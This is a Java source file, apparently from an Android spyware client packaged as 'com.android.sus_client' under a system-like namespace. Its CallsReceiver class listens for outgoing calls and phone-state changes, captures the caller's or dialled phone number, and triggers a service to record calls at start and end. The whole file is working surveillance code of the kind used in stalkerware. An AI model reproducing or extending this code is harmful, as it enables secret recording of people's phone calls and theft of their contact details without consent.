package com.android.sus_client.background.calls;

import static com.android.sus_client.utils.Constants.COMMAND_TYPE_CALL;
import static com.android.sus_client.utils.Constants.PHONE_NUMBER;
import static com.android.sus_client.utils.Constants.STATE_CALL_END;
import static com.android.sus_client.utils.Constants.STATE_CALL_START;
import static com.android.sus_client.utils.Constants.STATE_INCOMING_NUMBER;
import static com.android.sus_client.utils.Constants.TYPE_CALL;
import static com.android.sus_client.utils.Constants.TYPE_CALL_INCOMING;
import static com.android.sus_client.utils.Constants.TYPE_CALL_OUTGOING;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.TelephonyManager;

import com.android.sus_client.utils.Actions;

public class CallsReceiver extends BroadcastReceiver {

    private String phoneNumber;
    private String extraState;

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (action != null && (action.equals(Intent.ACTION_NEW_OUTGOING_CALL) || action.equals(TelephonyManager.ACTION_PHONE_STATE_CHANGED))) {
            phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
            extraState = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
            startCallService(context, intent);
        }
    }

    private void startCallService(Context context, Intent intent) {
        if (extraState != null) {
            if (extraState.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
                setIntentType(context, STATE_CALL_START);
            } else if (extraState.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                setIntentType(context, STATE_CALL_END);
            } else if (extraState.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                if (phoneNumber == null)
                    phoneNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
                setIntentTypeExtra(context, TYPE_CALL_INCOMING);
            }
        } else if (phoneNumber != null) {
            setIntentTypeExtra(context, TYPE_CALL_OUTGOING);
        }
    }

    private void setIntentType(Context context, int callType) {
        Intent myIntent = ActionService.getActionIntent(context, Actions.RECORD_CALL);
        myIntent.putExtra(COMMAND_TYPE_CALL, callType);
        context.startService(myIntent);
    }

    private void setIntentTypeExtra(Context context, int callType) {
        Intent myIntent = ActionService.getActionIntent(context, Actions.RECORD_CALL);
        myIntent.putExtra(COMMAND_TYPE_CALL, STATE_INCOMING_NUMBER);
        myIntent.putExtra(PHONE_NUMBER, phoneNumber);
        myIntent.putExtra(TYPE_CALL, callType);
        context.startService(myIntent);
    }

}